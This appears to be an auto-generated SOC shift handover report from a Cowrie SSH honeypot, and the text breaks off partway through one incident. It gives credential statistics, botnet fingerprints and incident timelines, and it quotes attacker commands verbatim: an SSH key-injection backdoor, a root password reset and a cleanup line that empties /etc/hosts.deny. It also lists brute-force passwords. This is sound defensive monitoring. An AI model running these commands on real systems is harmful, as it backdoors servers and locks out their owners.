# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-09 |
| **Generated At** | 2026-06-09T14:59:50Z |
| **Shift Time** | 14:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1356** |
| Confirmed Threats | **1329** |
| False Positives Filtered | **27** (2.0%) |
| Unique Attacker IPs | **55** |
| Countries of Origin | **17** |
| High Severity Cases | **116** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1240** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **318** |
| Unique Credential Pairs | **204** |
| Unique Usernames | **128** |
| Unique Passwords | **167** |
| Successful Auth Pairs | **79** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 116 |
| `345gs5662d34` | 51 |
| `deploy` | 5 |
| `ubuntu` | 3 |
| `postgres` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 51 |
| `3245gs5662d34` | 51 |
| `123456` | 17 |
| `123` | 8 |
| `1` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 51 |
| `root` | `3245gs5662d34` | 51 |
| `root` | `abcABC123!@#` | 2 |
| `Administrator` | `Administrator123` | 2 |
| `paula` | `paula1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456.qq` | `103.13.206.100` | 2026-06-09T11:19:19 |
| `root` | `3245gs5662d34` | `103.13.206.100` | 2026-06-09T11:19:22 |
| `root` | `abcABC123!@#` | `103.13.206.100` | 2026-06-09T11:22:10 |
| `root` | `qwerty78` | `20.116.34.103` | 2026-06-09T11:22:42 |
| `root` | `3245gs5662d34` | `20.116.34.103` | 2026-06-09T11:22:47 |
| `root` | `456456` | `49.64.242.249` | 2026-06-09T11:23:38 |
| `root` | `565656` | `49.64.242.249` | 2026-06-09T11:33:33 |
| `root` | `Germany2026` | `49.64.242.249` | 2026-06-09T11:34:35 |
| `root` | `P@ssw0rd@2024` | `103.13.206.100` | 2026-06-09T11:35:57 |
| `root` | `default` | `49.64.242.249` | 2026-06-09T11:37:31 |
| `root` | `3245gs5662d34` | `49.64.242.249` | 2026-06-09T11:37:41 |
| `root` | `william` | `13.94.39.162` | 2026-06-09T11:38:19 |
| `root` | `3245gs5662d34` | `13.94.39.162` | 2026-06-09T11:39:23 |
| `root` | `william` | `103.143.10.140` | 2026-06-09T11:41:28 |
| `root` | `123QWEqwe@` | `103.13.206.100` | 2026-06-09T11:41:32 |
| `root` | `3245gs5662d34` | `103.143.10.140` | 2026-06-09T11:41:34 |
| `root` | `letmein2025` | `40.74.68.248` | 2026-06-09T11:41:44 |
| `root` | `3245gs5662d34` | `40.74.68.248` | 2026-06-09T11:42:11 |
| `root` | `Ruibo2025!@#` | `103.13.206.100` | 2026-06-09T11:44:21 |
| `root` | `Jia@1234` | `135.13.28.35` | 2026-06-09T11:44:44 |
| `root` | `3245gs5662d34` | `135.13.28.35` | 2026-06-09T11:44:46 |
| `root` | `112` | `103.143.10.140` | 2026-06-09T11:46:38 |
| `root` | `abcABC123!@#` | `103.143.10.140` | 2026-06-09T11:48:14 |
| `root` | `lenovo@123` | `103.143.10.140` | 2026-06-09T11:53:27 |
| `root` | `root-123` | `40.74.68.248` | 2026-06-09T11:55:01 |
| `root` | `P@ssw0rd@2024` | `103.143.10.140` | 2026-06-09T11:56:59 |
| `root` | `1qaz!QAZ1` | `106.75.224.96` | 2026-06-09T11:58:40 |
| `root` | `3245gs5662d34` | `106.75.224.96` | 2026-06-09T11:58:44 |
| `root` | `!Password123` | `103.143.10.140` | 2026-06-09T12:03:56 |
| `root` | `P@$$w0rd@2025` | `101.36.111.155` | 2026-06-09T12:08:09 |
| `root` | `3245gs5662d34` | `101.36.111.155` | 2026-06-09T12:08:16 |
| `root` | `tempserver` | `40.74.68.248` | 2026-06-09T12:08:20 |
| `root` | `Qq@2026` | `135.13.28.35` | 2026-06-09T12:09:41 |
| `root` | `qwert@12345` | `135.13.28.35` | 2026-06-09T12:14:04 |
| `root` | `Start123` | `103.143.10.140` | 2026-06-09T12:14:28 |
| `root` | `abc-123456` | `135.13.28.35` | 2026-06-09T12:16:21 |
| `root` | `123QWEqwe@` | `103.143.10.140` | 2026-06-09T12:18:00 |
| `root` | `Support2025!` | `135.13.28.35` | 2026-06-09T12:18:40 |
| `root` | `admin@123@` | `101.47.155.9` | 2026-06-09T12:24:40 |
| `root` | `3245gs5662d34` | `101.47.155.9` | 2026-06-09T12:24:42 |
| `root` | `ubuntu` | `120.48.50.133` | 2026-06-09T12:24:47 |
| `root` | `Ruibo2025!@#` | `103.143.10.140` | 2026-06-09T12:26:41 |
| `root` | `asd123...` | `116.233.39.105` | 2026-06-09T12:36:36 |
| `root` | `QWERTY12345` | `135.13.28.35` | 2026-06-09T12:41:33 |
| `root` | `Aaaa1234` | `40.74.68.248` | 2026-06-09T12:42:10 |
| `root` | `Nb123456` | `135.13.28.35` | 2026-06-09T12:43:49 |
| `root` | `Jr12345678` | `40.74.68.248` | 2026-06-09T13:08:25 |
| `root` | `qwe123!@` | `45.114.63.76` | 2026-06-09T13:15:21 |
| `root` | `abcd@1234` | `45.114.63.76` | 2026-06-09T13:16:03 |
| `root` | `test@123` | `45.114.63.76` | 2026-06-09T13:16:07 |
| `root` | `000` | `40.74.68.248` | 2026-06-09T13:22:13 |
| `root` | `1qazCDE#` | `40.74.68.248` | 2026-06-09T13:28:49 |
| `root` | `ZAQ!xsw2` | `101.36.111.155` | 2026-06-09T13:32:34 |
| `root` | `welcome2025` | `101.36.111.155` | 2026-06-09T13:36:05 |
| `root` | `123@123Aa` | `119.246.15.94` | 2026-06-09T13:58:16 |
| `root` | `3245gs5662d34` | `119.246.15.94` | 2026-06-09T13:58:20 |
| `root` | `@qwer2025` | `119.246.15.94` | 2026-06-09T14:03:55 |
| `root` | `1Qa2Ws3Ed` | `119.246.15.94` | 2026-06-09T14:12:50 |
| `root` | `iptv123` | `119.96.157.188` | 2026-06-09T14:13:59 |
| `root` | `qwerty@123` | `119.96.157.188` | 2026-06-09T14:14:31 |
| `root` | `qazwsx12` | `119.246.15.94` | 2026-06-09T14:18:55 |
| `root` | `xsw2!QAZ` | `119.96.157.188` | 2026-06-09T14:21:52 |
| `root` | `545454` | `119.96.157.188` | 2026-06-09T14:22:45 |
| `root` | `qaz123WSX` | `103.52.114.250` | 2026-06-09T14:22:57 |
| `root` | `3245gs5662d34` | `103.52.114.250` | 2026-06-09T14:23:02 |
| `root` | `Hl123456` | `119.246.15.94` | 2026-06-09T14:24:36 |
| `root` | `admin000@@@` | `120.87.99.202` | 2026-06-09T14:26:55 |
| `root` | `3245gs5662d34` | `120.87.99.202` | 2026-06-09T14:27:05 |
| `root` | `123456AA` | `118.26.36.195` | 2026-06-09T14:37:13 |
| `root` | `3245gs5662d34` | `118.26.36.195` | 2026-06-09T14:37:16 |
| `root` | `lucas123` | `118.26.36.195` | 2026-06-09T14:39:00 |
| `root` | `admin123@@` | `118.26.36.195` | 2026-06-09T14:40:54 |
| `root` | `1qaz2wsx3edc@123` | `118.26.36.195` | 2026-06-09T14:42:53 |
| `root` | `123456Aa.` | `118.26.36.195` | 2026-06-09T14:44:51 |
| `root` | `7895123` | `118.196.119.108` | 2026-06-09T14:47:57 |
| `root` | `kokoko` | `118.26.36.195` | 2026-06-09T14:50:28 |
| `root` | `Pi123321` | `118.196.119.108` | 2026-06-09T14:55:21 |
| `root` | `td123456` | `118.26.36.195` | 2026-06-09T14:55:54 |
| `root` | `Qwer@123456789` | `118.26.36.195` | 2026-06-09T14:57:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1356** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 365 |
| Go SSH scanner | 28 |
| OpenSSH | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 246 | 17 |
| `03a80b21afa8...` | Modern SSH client | 82 | 9 |
| `0a07365cc01f...` | Generic scanner | 22 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 3 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 246 | 17 | Mirai/variant |
| `03a80b21afa8...` | libssh | 82 | 9 | Modern SSH client |
| `95420f9d932d...` | libssh | 36 | 9 | — |
| `0a07365cc01f...` | Go SSH scanner | 22 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 3 | 3 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 51 | 14 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:K4YhddRwa9KA"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `116.233.39.105`, `119.96.157.188`, `118.196.119.108`, `49.64.242.249`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
uname
```
```
uname -a
```
Source IPs: `49.64.242.249`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.75.224.96`, `40.74.68.248`, `103.13.206.100`, `13.94.39.162`, `118.26.36.195`, `20.116.34.103`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **55** |
| Unique ASNs | **37** |
| High-Risk ASNs | **31** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS4811` | China Telecom (Group) | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (116)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fcc3072ca129

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:19 |
| **Last Seen** | 2026-06-09 11:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:19:19` | `cowrie.session.connect` |
| `2026-06-09 11:19:19` | `cowrie.client.version` |
| `2026-06-09 11:19:19` | `cowrie.client.kex` |
| `2026-06-09 11:19:19` | `cowrie.login.success` |
| `2026-06-09 11:19:19` | `cowrie.session.params` |
| `2026-06-09 11:19:19` | `cowrie.command.input` |
| `2026-06-09 11:19:19` | `cowrie.command.failed` |
| `2026-06-09 11:19:20` | `cowrie.log.closed` |
| `2026-06-09 11:19:20` | `cowrie.session.params` |
| `2026-06-09 11:19:20` | `cowrie.command.input` |
| `2026-06-09 11:19:20` | `cowrie.session.file_download` |
| `2026-06-09 11:19:20` | `cowrie.log.closed` |
| `2026-06-09 11:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e6e99f283b6

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:19 |
| **Last Seen** | 2026-06-09 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:19:21` | `cowrie.session.connect` |
| `2026-06-09 11:19:21` | `cowrie.client.version` |
| `2026-06-09 11:19:21` | `cowrie.client.kex` |
| `2026-06-09 11:19:22` | `cowrie.login.success` |
| `2026-06-09 11:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f2c02d8654

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:22 |
| **Last Seen** | 2026-06-09 11:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:22:10` | `cowrie.session.connect` |
| `2026-06-09 11:22:10` | `cowrie.client.version` |
| `2026-06-09 11:22:10` | `cowrie.client.kex` |
| `2026-06-09 11:22:10` | `cowrie.login.success` |
| `2026-06-09 11:22:10` | `cowrie.session.params` |
| `2026-06-09 11:22:10` | `cowrie.command.input` |
| `2026-06-09 11:22:10` | `cowrie.command.failed` |
| `2026-06-09 11:22:11` | `cowrie.log.closed` |
| `2026-06-09 11:22:11` | `cowrie.session.params` |
| `2026-06-09 11:22:11` | `cowrie.command.input` |
| `2026-06-09 11:22:11` | `cowrie.session.file_download` |
| `2026-06-09 11:22:11` | `cowrie.log.closed` |
| `2026-06-09 11:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0508e755e678

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-06-09 11:22 |
| **Last Seen** | 2026-06-09 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:22:12` | `cowrie.session.connect` |
| `2026-06-09 11:22:12` | `cowrie.client.version` |
| `2026-06-09 11:22:12` | `cowrie.client.kex` |
| `2026-06-09 11:22:13` | `cowrie.login.success` |
| `2026-06-09 11:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39a5c17ce36

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-06-09 11:22 |
| **Last Seen** | 2026-06-09 11:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:22:41` | `cowrie.session.connect` |
| `2026-06-09 11:22:41` | `cowrie.client.version` |
| `2026-06-09 11:22:41` | `cowrie.client.kex` |
| `2026-06-09 11:22:42` | `cowrie.login.success` |
| `2026-06-09 11:22:42` | `cowrie.session.params` |
| `2026-06-09 11:22:42` | `cowrie.command.input` |
| `2026-06-09 11:22:42` | `cowrie.command.failed` |
| `2026-06-09 11:22:43` | `cowrie.log.closed` |
| `2026-06-09 11:22:43` | `cowrie.session.params` |
| `2026-06-09 11:22:43` | `cowrie.command.input` |
| `2026-06-09 11:22:43` | `cowrie.session.file_download` |
| `2026-06-09 11:22:43` | `cowrie.log.closed` |
| `2026-06-09 11:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0d2450a607

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-06-09 11:22 |
| **Last Seen** | 2026-06-09 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:22:46` | `cowrie.session.connect` |
| `2026-06-09 11:22:46` | `cowrie.client.version` |
| `2026-06-09 11:22:46` | `cowrie.client.kex` |
| `2026-06-09 11:22:47` | `cowrie.login.success` |
| `2026-06-09 11:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a95d595ffd84

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-09 11:23 |
| **Last Seen** | 2026-06-09 11:24 |
| **Session Duration** | 82s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, uname, uname -a` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 11:23:37` | `cowrie.session.connect` |
| `2026-06-09 11:23:37` | `cowrie.client.version` |
| `2026-06-09 11:23:37` | `cowrie.client.kex` |
| `2026-06-09 11:23:38` | `cowrie.login.success` |
| `2026-06-09 11:23:38` | `cowrie.session.params` |
| `2026-06-09 11:23:38` | `cowrie.command.input` |
| `2026-06-09 11:23:38` | `cowrie.command.failed` |
| `2026-06-09 11:23:39` | `cowrie.log.closed` |
| `2026-06-09 11:23:40` | `cowrie.session.params` |
| `2026-06-09 11:23:40` | `cowrie.command.input` |
| `2026-06-09 11:23:40` | `cowrie.session.file_download` |
| `2026-06-09 11:23:40` | `cowrie.log.closed` |
| `2026-06-09 11:23:54` | `cowrie.session.params` |
| `2026-06-09 11:23:54` | `cowrie.command.input` |
| `2026-06-09 11:24:55` | `cowrie.session.params` |
| `2026-06-09 11:24:55` | `cowrie.command.input` |
| `2026-06-09 11:24:55` | `cowrie.log.closed` |
| `2026-06-09 11:24:56` | `cowrie.session.params` |
| `2026-06-09 11:24:56` | `cowrie.command.input` |
| `2026-06-09 11:24:57` | `cowrie.log.closed` |
| `2026-06-09 11:24:58` | `cowrie.session.params` |
| `2026-06-09 11:24:58` | `cowrie.command.input` |
| `2026-06-09 11:24:58` | `cowrie.log.closed` |
| `2026-06-09 11:24:58` | `cowrie.session.params` |
| `2026-06-09 11:24:58` | `cowrie.command.input` |
| `2026-06-09 11:24:59` | `cowrie.log.closed` |
| `2026-06-09 11:24:59` | `cowrie.session.params` |
| `2026-06-09 11:24:59` | `cowrie.command.input` |
| `2026-06-09 11:24:59` | `cowrie.log.closed` |
| `2026-06-09 11:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eea31b39729f

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-09 11:33 |
| **Last Seen** | 2026-06-09 11:34 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
